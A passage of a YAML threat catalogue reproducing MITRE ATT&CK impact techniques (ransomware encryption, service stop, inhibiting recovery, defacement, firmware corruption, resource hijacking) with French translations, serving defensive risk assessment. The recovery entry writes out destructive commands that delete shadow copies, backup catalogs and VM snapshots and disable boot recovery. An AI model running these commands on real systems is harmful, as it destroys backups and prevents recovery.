  - urn: urn:intuitem:risk:threat:mitre-attack:t1486
    ref_id: T1486
    name: Data Encrypted for Impact
    description: "Adversaries may encrypt data on target systems or on large numbers\
      \ of systems in a network to interrupt availability to system and network resources.\
      \ They can attempt to render stored data inaccessible by encrypting files or\
      \ data on local and remote drives and withholding access to a decryption key.\
      \ This may be done in order to extract monetary compensation from a victim in\
      \ exchange for decryption or a decryption key (ransomware) or to render data\
      \ permanently inaccessible in cases where the key is not saved or transmitted.(Citation:\
      \ US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT\
      \ NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware,\
      \ it is typical that common user files like Office documents, PDFs, images,\
      \ videos, audio, text, and source code files will be encrypted (and often renamed\
      \ and/or tagged with specific file markers). Adversaries may need to first employ\
      \ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222)\
      \ or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in\
      \ order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack\
      \ Conti July 2020) In some cases, adversaries may encrypt critical system files,\
      \ disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries\
      \ may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation:\
      \ Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the\
      \ target organization, malware designed for encrypting data may have worm-like\
      \ features to propagate across a network by leveraging other attack techniques\
      \ like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential\
      \ Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin\
      \ Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye\
      \ WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also\
      \ leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001),\
      \ such as changing victim wallpapers or ESXi server login messages, or otherwise\
      \ intimidate victims by sending ransom notes or other messages to connected\
      \ printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation:\
      \ Varonis)\n\nIn cloud environments, storage objects within compromised accounts\
      \ may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example,\
      \ in AWS environments, adversaries may leverage services such as AWS\u2019s\
      \ Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation:\
      \ Halcyon AWS Ransomware 2025)\nhttps://attack.mitre.org/techniques/T1486"
    translations:
      fr:
        name: "Donn\xE9es chiffr\xE9es pour l\u2019impact"
        description: "Les adversaires peuvent chiffrer des donn\xE9es sur les syst\xE8\
          mes cibles ou sur un grand nombre de syst\xE8mes dans un r\xE9seau afin\
          \ d\u2019interrompre la disponibilit\xE9 des ressources syst\xE8me et r\xE9\
          seau. Ils peuvent tenter de rendre les donn\xE9es stock\xE9es inaccessibles\
          \ en chiffreant des fichiers ou des donn\xE9es sur des disques locaux et\
          \ distants et en refusant l\u2019acc\xE8s \xE0 une cl\xE9 de d\xE9chiffrement.\
          \ Cela peut \xEAtre fait afin d\u2019obtenir une compensation financi\xE8\
          re d\u2019une victime en \xE9change d\u2019un d\xE9chiffrement ou d\u2019\
          une cl\xE9 de d\xE9chiffrement (ransomware), ou de rendre les donn\xE9es\
          \ d\xE9finitivement inaccessibles dans les cas o\xF9 la cl\xE9 n\u2019est\
          \ ni sauvegard\xE9e ni transmise. (Citation : Ransomware US-CERT 2016)(Citation\
          \ : FireEye WannaCry 2017)(Citation : US-CERT NotPetya 2017)(Citation :\
          \ US-CERT Sam 2018)\n\nDans le cas des ransomwares, il est courant que les\
          \ fichiers utilisateurs courants comme les documents Office, PDF, images,\
          \ vid\xE9os, fichiers audio, textes et fichiers de code source soient chiffr\xE9\
          s (et souvent renomm\xE9s et/ou tagu\xE9s avec des marqueurs de fichiers\
          \ sp\xE9cifiques). Les adversaires peuvent d\u2019abord avoir besoin d\u2019\
          employer d\u2019autres comportements, tels que [Modification des permissions\
          \ de fichier et de r\xE9pertoire](https://attack.mitre.org/techniques/T1222)\
          \ ou [Arr\xEAt/Red\xE9marrage du syst\xE8me](https://attack.mitre.org/techniques/T1529),\
          \ afin de d\xE9verrouiller et/ou d\u2019acc\xE9der \xE0 la manipulation\
          \ de ces fichiers. (Citation : CarbonBlack Conti juillet 2020) Dans certains\
          \ cas, les adversaires peuvent chiffrer des fichiers syst\xE8me critiques,\
          \ des partitions de disque et le MBR. (Citation : US-CERT NotPetya 2017)\
          \ Les adversaires peuvent \xE9galement chiffrer des machines virtuelles\
          \ h\xE9berg\xE9es sur ESXi ou d\u2019autres hyperviseurs. (Citation : Crowdstrike\
          \ Hyperviseur Jackpotting Partie 2 2021) \n\nPour maximiser l\u2019impact\
          \ sur l\u2019organisation cible, les logiciels malveillants con\xE7us pour\
          \ chiffrer les donn\xE9es peuvent disposer de fonctionnalit\xE9s de type\
          \ ver pour se propager sur un r\xE9seau en utilisant d\u2019autres techniques\
          \ d\u2019attaque telles que [Comptes valides](https://attack.mitre.org/techniques/T1078),\
          \ [Dumping des identifiants du syst\xE8me d\u2019exploitation](https://attack.mitre.org/techniques/T1003)\
          \ et [Partages d\u2019administration SMB/Windows](https://attack.mitre.org/techniques/T1021/002).\
          \ (Citation : FireEye WannaCry 2017)(Citation : US-CERT NotPetya 2017) Les\
          \ logiciels malveillants de chiffrement peuvent \xE9galement exploiter [D\xE9\
          gradation interne](https://attack.mitre.org/techniques/T1491/001), comme\
          \ modifier les fonds d\u2019\xE9cran des victimes ou les messages de connexion\
          \ des serveurs ESXi, ou intimider les victimes en envoyant des notes de\
          \ ran\xE7on ou d\u2019autres messages aux imprimantes connect\xE9es (appel\xE9\
          \ \xAB print bombing \xBB). (Citation : NHS Digital Egregor nov. 2020)(Citation\
          \ : Varonis)\n\nDans les environnements cloud, les objets de stockage contenus\
          \ dans des comptes compromis peuvent \xE9galement \xEAtre chiffr\xE9s. (Citation\
          \ : Rhino S3 Ransomware Partie 1) Par exemple, dans les environnements AWS,\
          \ les adversaires peuvent utiliser des services tels que le chiffrement\
          \ c\xF4t\xE9 serveur avec cl\xE9s fournies par le client (SSE-C) d\u2019\
          AWS pour chiffrer les donn\xE9es. (Citation : Halcyon AWS Ransomware 2025)\n\
          https://attack.mitre.org/techniques/T1486"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1489
    ref_id: T1489
    name: Service Stop
    description: "Adversaries may stop or disable services on a system to render those\
      \ services unavailable to legitimate users. Stopping critical services or processes\
      \ can inhibit or stop response to an incident or aid in the adversary's overall\
      \ objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer\
      \ 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by\
      \ disabling individual services of high importance to an organization, such\
      \ as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation:\
      \ Novetta Blockbuster) In some cases, adversaries may stop or disable many or\
      \ all services to render systems unusable.(Citation: Talos Olympic Destroyer\
      \ 2018) Services or processes may not allow for modification of their data stores\
      \ while running. Adversaries may stop services or processes in order to conduct\
      \ [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted\
      \ for Impact](https://attack.mitre.org/techniques/T1486) on the data stores\
      \ of services like Exchange and SQL Server, or on virtual machines hosted on\
      \ ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike\
      \ Hypervisor Jackpotting Pt 2 2021)\n\nThreat actors may also disable or stop\
      \ service in cloud environments. For example, by leveraging the `DisableAPIServiceAccess`\
      \ API in AWS, a threat actor may prevent the service from creating service-linked\
      \ roles on new accounts in the AWS Organization.(Citation: Datadog Security\
      \ Labs Cloud Persistence 2025)(Citation: AWS DisableAWSServiceAccess)\nhttps://attack.mitre.org/techniques/T1489"
    translations:
      fr:
        name: "Arr\xEAt de service"
        description: "Les adversaires peuvent arr\xEAter ou d\xE9sactiver des services\
          \ sur un syst\xE8me afin de rendre ces services inaccessibles aux utilisateurs\
          \ l\xE9gitimes. Arr\xEAter des services ou processus critiques peut inhiber\
          \ ou arr\xEAter la r\xE9ponse \xE0 un incident ou aider \xE0 atteindre les\
          \ objectifs globaux de l\u2019adversaire : causer des dommages \xE0 l\u2019\
          environnement. (Citation : Talos Olympic Destroyer 2018)(Citation : Blockbuster\
          \ de Novetta) \n\nLes adversaires peuvent y parvenir en d\xE9sactivant des\
          \ services individuels de grande importance pour une organisation, tels\
          \ que <code>MSExchangeIS,</code> ce qui rendra le contenu Exchange inaccessible.\
          \ (Citation : Blockbuster de Novetta) Dans certains cas, les adversaires\
          \ peuvent arr\xEAter ou d\xE9sactiver de nombreux services voire tous les\
          \ services pour rendre les syst\xE8mes inutilisables. (Citation : Talos\
          \ Olympic Destroyer 2018) Les services ou processus peuvent ne pas permettre\
          \ la modification de leurs r\xE9serves de donn\xE9es pendant l\u2019ex\xE9\
          cution. Les adversaires peuvent arr\xEAter des services ou des processus\
          \ afin de r\xE9aliser [Destruction de donn\xE9es](https://attack.mitre.org/techniques/T1485)\
          \ ou [Donn\xE9es chiffr\xE9es pour impact](https://attack.mitre.org/techniques/T1486)\
          \ sur les magasins de donn\xE9es de services comme Exchange et SQL Server,\
          \ ou sur des machines virtuelles h\xE9berg\xE9es sur l\u2019infrastructure\
          \ ESXi. (Citation : Analyse SecureWorks WannaCry)(Citation : Crowdstrike\
          \ Hyperviseur Jackpotting Partie 2 2021)\n\nLes acteurs malveillants peuvent\
          \ \xE9galement d\xE9sactiver ou arr\xEAter le service dans les environnements\
          \ cloud. Par exemple, en exploitant l\u2019API \xAB DisableAPIServiceAccess\
          \ \xBB dans AWS, un acteur de menace peut emp\xEAcher le service de cr\xE9\
          er des r\xF4les li\xE9s au service sur de nouveaux comptes dans l\u2019\
          organisation AWS. (Citation : Datadog Security Labs Cloud Persistence 2025)(Citation\
          \ : AWS DisableAWSServiceAccess)\nhttps://attack.mitre.org/techniques/T1489"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1490
    ref_id: T1490
    name: Inhibit System Recovery
    description: "Adversaries may delete or remove built-in data and turn off services\
      \ designed to aid in the recovery of a corrupted system to prevent recovery.(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny\
      \ access to available backups and recovery options.\n\nOperating systems may\
      \ contain features that can help fix corrupted systems, such as a backup catalog,\
      \ volume shadow copies, and automatic repair features. Adversaries may disable\
      \ or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485)\
      \ and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation:\
      \ Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore,\
      \ adversaries may disable recovery notifications, then corrupt backups.(Citation:\
      \ disable_notif_synology_ransom)\n\nA number of native Windows utilities have\
      \ been used by adversaries to disable or delete system recovery features:\n\n\
      * <code>vssadmin.exe</code> can be used to delete all volume shadow copies on\
      \ a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows\
      \ Management Instrumentation](https://attack.mitre.org/techniques/T1047) can\
      \ be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n\
      * <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog\
      \ - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code>\
      \ can be used to disable automatic Windows recovery features by modifying boot\
      \ configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\
      \ & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>\
      \ can be used to disable Windows Recovery Environment (WinRE) repair/recovery\
      \ options of an infected system\n* <code>diskshadow.exe</code> can be used to\
      \ delete all volume shadow copies on a system - <code>diskshadow delete shadows\
      \ all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network\
      \ devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561)\
      \ to delete backup firmware images and reformat the file system, then [System\
      \ Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the\
      \ device. Together this activity may leave network devices completely inoperable\
      \ and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete\
      \ or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486),\
      \ preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation:\
      \ Cybereason)\n\nAdversaries may also delete \u201Conline\u201D backups that\
      \ are connected to their network \u2013 whether via network storage media or\
      \ through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups\
      \ 2020) In cloud environments, adversaries may disable versioning and backup\
      \ policies and delete snapshots, database backups, machine images, and prior\
      \ versions of objects designed to be used in disaster recovery scenarios.(Citation:\
      \ Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3\
      \ Ransomware)\nhttps://attack.mitre.org/techniques/T1490"
    translations:
      fr:
        name: "Inhiber la r\xE9cup\xE9ration du syst\xE8me"
        description: "Les attaquants peuvent supprimer ou effacer des donn\xE9es int\xE9\
          gr\xE9es et d\xE9sactiver les services destin\xE9s \xE0 faciliter la restauration\
          \ d\u2019un syst\xE8me endommag\xE9 afin d\u2019emp\xEAcher toute r\xE9\
          cup\xE9ration. (R\xE9f\xE9rence : Talos Olympic Destroyer 2018) (R\xE9f\xE9\
          rence : FireEye WannaCry 2017) Cela peut emp\xEAcher l\u2019acc\xE8s aux\
          \ sauvegardes disponibles et aux options de restauration.\n\nLes syst\xE8\
          mes d\u2019exploitation peuvent comporter des fonctionnalit\xE9s permettant\
          \ de r\xE9parer les syst\xE8mes endommag\xE9s, telles qu\u2019un catalogue\
          \ de sauvegardes, des clich\xE9s instantan\xE9s de volume et des fonctions\
          \ de r\xE9paration automatique. Les attaquants peuvent d\xE9sactiver ou\
          \ supprimer les fonctionnalit\xE9s de r\xE9cup\xE9ration du syst\xE8me afin\
          \ d\u2019amplifier les effets de la [destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485)\
          \ et du [chiffrement des donn\xE9es \xE0 des fins d\u2019impact](https://attack.mitre.org/techniques/T1486).\
          \ (R\xE9f\xE9rence : Talos Olympic Destroyer 2018) (R\xE9f\xE9rence : FireEye\
          \ WannaCry 2017) De plus, les attaquants peuvent d\xE9sactiver les notifications\
          \ de restauration, puis corrompre les sauvegardes. (R\xE9f\xE9rence : disable_notif_synology_ransom)\n\
          \nPlusieurs utilitaires natifs de Windows ont \xE9t\xE9 utilis\xE9s par\
          \ des attaquants pour d\xE9sactiver ou supprimer les fonctionnalit\xE9s\
          \ de restauration du syst\xE8me :\n\n* <code>vssadmin.exe</code> peut \xEA\
          tre utilis\xE9 pour supprimer tous les clich\xE9s instantan\xE9s de volume\
          \ d'un syst\xE8me - <code>vssadmin.exe delete shadows /all /quiet</code>\n\
          * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
          \ peut \xEAtre utilis\xE9 pour supprimer les clich\xE9s instantan\xE9s de\
          \ volume - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code>\
          \ peut \xEAtre utilis\xE9 pour supprimer le catalogue de sauvegarde Windows\
          \ - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code>\
          \ permet de d\xE9sactiver les fonctionnalit\xE9s de r\xE9cup\xE9ration automatique\
          \ de Windows en modifiant les donn\xE9es de configuration de d\xE9marrage\
          \ - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\
          \ & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code>\
          \ peut \xEAtre utilis\xE9 pour d\xE9sactiver les options de r\xE9paration/r\xE9\
          cup\xE9ration de l\u2019environnement de r\xE9cup\xE9ration Windows (WinRE)\
          \ d\u2019un syst\xE8me infect\xE9\n* <code>diskshadow.exe</code> peut \xEA\
          tre utilis\xE9 pour supprimer tous les clich\xE9s instantan\xE9s de volume\
          \ d\u2019un syst\xE8me - <code>diskshadow delete shadows all</code> (Source\
          \ : Diskshadow) (Source : Crytox Ransomware)\n\nSur les p\xE9riph\xE9riques\
          \ r\xE9seau, les attaquants peuvent utiliser la fonction [Effacement du\
          \ disque](https://attack.mitre.org/techniques/T1561) pour supprimer les\
          \ images de firmware de secours et reformater le syst\xE8me de fichiers,\
          \ puis la fonction [Arr\xEAt/Red\xE9marrage du syst\xE8me](https://attack.mitre.org/techniques/T1529)\
          \ pour relancer le p\xE9riph\xE9rique. Concr\xE8tement, ces actions peuvent\
          \ rendre les p\xE9riph\xE9riques r\xE9seau totalement hors service et emp\xEA\
          cher toute op\xE9ration de restauration.\n\nSur les serveurs ESXi, les attaquants\
          \ peuvent supprimer ou chiffrer les instantan\xE9s des machines virtuelles\
          \ afin de faciliter le [chiffrement des donn\xE9es \xE0 des fins de ran\xE7\
          on](https://attack.mitre.org/techniques/T1486), les emp\xEAchant ainsi d\u2019\
          \xEAtre utilis\xE9s comme sauvegardes (par exemple, via `vim-cmd vmsvc/snapshot.removeall`).\
          \ (Source : Cybereason)\n\nLes attaquants peuvent \xE9galement supprimer\
          \ les sauvegardes \xAB en ligne \xBB connect\xE9es \xE0 leur r\xE9seau,\
          \ que ce soit via des supports de stockage r\xE9seau ou par le biais de\
          \ dossiers synchronis\xE9s avec des services cloud. (Source : ZDNet Ransomware\
          \ Backups 2020) Dans les environnements cloud, les attaquants peuvent d\xE9\
          sactiver les politiques de gestion des versions et de sauvegarde, puis supprimer\
          \ les instantan\xE9s, les sauvegardes de bases de donn\xE9es, les images\
          \ de machines et les versions ant\xE9rieures d\u2019objets destin\xE9s \xE0\
          \ \xEAtre utilis\xE9s dans des sc\xE9narios de reprise apr\xE8s sinistre.\
          \ (Source : Dark Reading \xAB Code Spaces Cyber Attack \xBB)(Source : Rhino\
          \ Security Labs \xAB AWS S3 Ransomware \xBB)\nhttps://attack.mitre.org/techniques/T1490"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491
    ref_id: T1491
    name: Defacement
    description: Adversaries may modify visual content available internally or externally
      to an enterprise network, thus affecting the integrity of the original content.
      Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include
      delivering messaging, intimidation, or claiming (possibly false) credit for
      an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491)
      in order to cause user discomfort, or to pressure compliance with accompanying
      messages.
    translations:
      fr:
        name: "D\xE9gradation"
        description: "Les adversaires peuvent modifier le contenu visuel disponible\
          \ en interne ou en externe sur un r\xE9seau d\u2019entreprise, affectant\
          \ ainsi l\u2019int\xE9grit\xE9 du contenu original. Les raisons de [D\xE9\
          gradation](https://attack.mitre.org/techniques/T1491) incluent la diffusion\
          \ de messages, l\u2019intimidation ou la revendication (possiblement fausse)\
          \ du cr\xE9dit d\u2019une intrusion. Des images troublantes ou offensantes\
          \ peuvent \xEAtre utilis\xE9es dans le cadre de [D\xE9figuration](https://attack.mitre.org/techniques/T1491)\
          \ afin de causer de l\u2019inconfort \xE0 l\u2019utilisateur ou de contraindre\
          \ \xE0 respecter les messages accompagnants."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.001
    ref_id: T1491.001
    name: Internal Defacement
    description: 'An adversary may deface systems internal to an organization in an
      attempt to intimidate or mislead users, thus discrediting the integrity of the
      systems. This may take the form of modifications to internal websites or server
      login messages, or directly to user systems with the replacement of the desktop
      wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive
      images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001)
      in order to cause user discomfort, or to pressure compliance with accompanying
      messages. Since internally defacing systems exposes an adversary''s presence,
      it often takes place after other intrusion goals have been accomplished.(Citation:
      Novetta Blockbuster Destructive Malware)'
    translations:
      fr:
        name: "D\xE9gradation interne"
        description: "Un adversaire peut vandalier des syst\xE8mes internes \xE0 une\
          \ organisation dans le but d\u2019intimider ou de tromper les utilisateurs,\
          \ discr\xE9ditant ainsi l\u2019int\xE9grit\xE9 de ces syst\xE8mes. Cela\
          \ peut prendre la forme de modifications de sites web internes ou de messages\
          \ de connexion serveur, ou directement sur les syst\xE8mes utilisateurs\
          \ avec le remplacement du fond d\u2019\xE9cran du bureau. (Citation : Blockbuster\
          \ de Novetta)(Citation : Varonis) Les images d\xE9rangeantes ou offensantes\
          \ peuvent \xEAtre utilis\xE9es dans le cadre de [D\xE9vandalit\xE9 interne](https://attack.mitre.org/techniques/T1491/001)\
          \ afin de causer de l\u2019inconfort \xE0 l\u2019utilisateur ou de contraindre\
          \ \xE0 respecter les messages accompagnants. Puisque la vandalage interne\
          \ des syst\xE8mes expose la pr\xE9sence d\u2019un adversaire, elle se produit\
          \ souvent apr\xE8s que d\u2019autres objectifs d\u2019intrusion ont \xE9\
          t\xE9 atteints. (Citation : Malware destructeur du Novetta Blockbuster)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.002
    ref_id: T1491.002
    name: External Defacement
    description: "An adversary may deface systems external to an organization in an\
      \ attempt to deliver messaging, intimidate, or otherwise mislead an organization\
      \ or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may ultimately cause users to distrust the systems and to question/discredit\
      \ the system\u2019s integrity. Externally-facing websites are a common victim\
      \ of defacement; often targeted by adversary and hacktivist groups in order\
      \ to push a political message or spread propaganda.(Citation: FireEye Cyber\
      \ Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate\
      \ Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt\
      \ Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may be used as a catalyst to trigger events, or as a response to actions taken\
      \ by an organization or government. Similarly, website defacement may also be\
      \ used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:\
      \ Trend Micro Deep Dive Into Defacement)"
    translations:
      fr:
        name: "D\xE9gradation externe"
        description: "Un adversaire peut vandaliser des syst\xE8mes externes \xE0\
          \ une organisation dans une tentative de transmettre des messages, intimider\
          \ ou induire en erreur une organisation ou des utilisateurs. [D\xE9figuration\
          \ externe](https://attack.mitre.org/techniques/T1491/002) peut finalement\
          \ amener les utilisateurs \xE0 se m\xE9fier des syst\xE8mes et \xE0 remettre\
          \ en question ou \xE0 discr\xE9diter l\u2019int\xE9grit\xE9 du syst\xE8\
          me. Les sites web orient\xE9s vers l\u2019ext\xE9rieur sont souvent victimes\
          \ de vandalit\xE9s ; souvent cibl\xE9 par des groupes adversaires et hacktivistes\
          \ afin de diffuser un message politique ou de propager de la propagande.\
          \ (Citation : Menaces cybern\xE9tiques de FireEye pour les industries m\xE9\
          diatiques)(Citation : D\xE9claration de Kevin Mandia \xE0 la commission\
          \ du renseignement du S\xE9nat am\xE9ricain)(Citation : Des hackers anonymes\
          \ d\xE9figurent un site gouvernemental russe) [D\xE9figuration externe](https://attack.mitre.org/techniques/T1491/002)\
          \ peut \xEAtre utilis\xE9 comme catalyseur pour d\xE9clencher des \xE9v\xE9\
          nements, ou comme r\xE9ponse aux actions entreprises par une organisation\
          \ ou un gouvernement. De m\xEAme, la d\xE9gradation de sites web peut aussi\
          \ servir de mise en place, ou de pr\xE9curseur, pour de futures attaques\
          \ telles que [Compromission en voiture](https://attack.mitre.org/techniques/T1189).\
          \ (Citation : Plong\xE9e approfondie dans la d\xE9figuration de Trend Micro)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1495
    ref_id: T1495
    name: Firmware Corruption
    description: 'Adversaries may overwrite or corrupt the flash memory contents of
      system BIOS or other firmware in devices attached to a system in order to render
      them inoperable or unable to boot, thus denying the availability to use the
      devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is
      software that is loaded and executed from non-volatile memory on hardware devices
      in order to initialize and manage device functionality. These devices may include
      the motherboard, hard drive, or video cards.


      In general, adversaries may manipulate, overwrite, or corrupt firmware in order
      to deny the use of the system or devices. For example, corruption of firmware
      responsible for loading the operating system for network devices may render
      the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation:
      cisa_malware_orgs_ukraine) Depending on the device, this attack may also result
      in [Data Destruction](https://attack.mitre.org/techniques/T1485).

      https://attack.mitre.org/techniques/T1495'
    translations:
      fr:
        name: Firmware Corruption
        description: "Les adversaires peuvent \xE9craser ou corrompre le contenu de\
          \ la m\xE9moire flash du BIOS syst\xE8me ou d\u2019autres firmwares dans\
          \ les p\xE9riph\xE9riques connect\xE9s \xE0 un syst\xE8me afin de les rendre\
          \ inop\xE9rants ou incapables de d\xE9marrer, privant ainsi la disponibilit\xE9\
          \ d\u2019utilisation des p\xE9riph\xE9riques et/ou du syst\xE8me. (Citation\
          \ : Symantec Tchernobyl W95. CIH) Le firmware est un logiciel charg\xE9\
          \ et ex\xE9cut\xE9 depuis une m\xE9moire non volatile sur des dispositifs\
          \ mat\xE9riels afin d\u2019initialiser et de g\xE9rer la fonctionnalit\xE9\
          \ de l\u2019appareil. Ces p\xE9riph\xE9riques peuvent inclure la carte m\xE8\
          re, le disque dur ou les cartes graphiques.\n\nEn g\xE9n\xE9ral, les adversaires\
          \ peuvent manipuler, \xE9craser ou corrompre le firmware afin d\u2019emp\xEA\
          cher l\u2019utilisation du syst\xE8me ou des appareils. Par exemple, la\
          \ corruption du firmware responsable du chargement du syst\xE8me d\u2019\
          exploitation pour les p\xE9riph\xE9riques r\xE9seau peut rendre les dispositifs\
          \ r\xE9seau inop\xE9rants. (Citation : dhs_threat_to_net_devices)(Citation\
          \ : cisa_malware_orgs_ukraine) Selon l\u2019appareil, cette attaque peut\
          \ \xE9galement entra\xEEner une [destruction des donn\xE9es](https://attack.mitre.org/techniques/T1485).\n\
          https://attack.mitre.org/techniques/T1495"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496
    ref_id: T1496
    name: Resource Hijacking
    description: "Adversaries may leverage the resources of co-opted systems to complete\
      \ resource-intensive tasks, which may impact system and/or hosted service availability.\
      \ \n\nResource hijacking may take a number of different forms. For example,\
      \ adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n\
      * Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n\
      * Abuse cloud-based messaging services to send large quantities of spam messages\n\
      \nIn some cases, adversaries may leverage multiple types of Resource Hijacking\
      \ at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)\nhttps://attack.mitre.org/techniques/T1496"
    translations:
      fr:
        name: "D\xE9tournement de ressources"
        description: "Les adversaires peuvent exploiter les ressources des syst\xE8\
          mes r\xE9cup\xE9r\xE9s pour accomplir des t\xE2ches gourmandes en ressources,\
          \ ce qui peut impacter la disponibilit\xE9 du syst\xE8me et/ou des services\
          \ h\xE9berg\xE9s. \n\nLe d\xE9tournement de ressources peut prendre plusieurs\
          \ formes diff\xE9rentes. Par exemple, les adversaires peuvent :\n\n* Exploiter\
          \ les ressources de calcul pour miner des cryptomonnaies\n* Vendre la bande\
          \ passante r\xE9seau aux r\xE9seaux proxy\n* G\xE9n\xE9rer du trafic SMS\
          \ \xE0 but lucratif\n* Abuser des services de messagerie bas\xE9s sur le\
          \ cloud pour envoyer de grandes quantit\xE9s de messages spam\n\nDans certains\
          \ cas, les adversaires peuvent exploiter simultan\xE9ment plusieurs types\
          \ de d\xE9tournement de ressources. (Citation : Sysdig Cryptojacking Proxy\
          \ 2023)\nhttps://attack.mitre.org/techniques/T1496"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496.001
    ref_id: T1496.001
    name: Compute Hijacking
    description: "Adversaries may leverage the compute resources of co-opted systems\
      \ to complete resource-intensive tasks, which may impact system and/or hosted\
      \ service availability. \n\nOne common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001)\
      \ is to validate transactions of cryptocurrency networks and earn virtual currency.\
      \ Adversaries may consume enough system resources to negatively impact and/or\
      \ cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus\
      \ Under The Hood Blog 2017) Servers and cloud-based systems are common targets\
      \ because of the high potential for available resources, but user endpoint systems\
      \ may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001)\
      \ and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized\
      \ environments may also be targeted due to the ease of deployment via exposed\
      \ APIs and the potential for scaling mining activities by deploying or compromising\
      \ multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard\
      \ Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some\
      \ cryptocurrency mining malware identify then kill off processes for competing\
      \ malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro\
      \ War of Crypto Miners)"
    translations:
      fr:
        name: "D\xE9tournement de calcul"
        description: "Les adversaires peuvent exploiter les ressources de calcul des\
          \ syst\xE8mes r\xE9cup\xE9r\xE9s pour accomplir des t\xE2ches gourmandes\
          \ en ressources, ce qui peut impacter la disponibilit\xE9 du syst\xE8me\
          \ et/ou des services h\xE9berg\xE9s. \n\nUn objectif courant du [d\xE9tournement\
          \ de calcul](https://attack.mitre.org/techniques/T1496/001) est de valider\
          \ les transactions de r\xE9seaux de cryptomonnaies et de gagner de la monnaie\
          \ virtuelle. Les adversaires peuvent consommer suffisamment de ressources\
          \ syst\xE8me pour avoir un impact n\xE9gatif et/ou rendre les machines affect\xE9\
          es non r\xE9actives. (Citation : Kaspersky Lazarus Under The Hood Blog 2017)\
          \ Les serveurs et les syst\xE8mes cloud sont des cibles courantes en raison\
          \ du fort potentiel de ressources disponibles, mais les syst\xE8mes de terminaison\
          \ utilisateur peuvent \xE9galement \xEAtre compromis et utilis\xE9s pour\
          \ le [d\xE9tournement de calcul](https://attack.mitre.org/techniques/T1496/001)\
          \ et le minage de cryptomonnaies. (Citation : CloudSploit - R\xE9gions AWS\
          \ inutilis\xE9es) Les environnements conteneuris\xE9s peuvent \xE9galement\
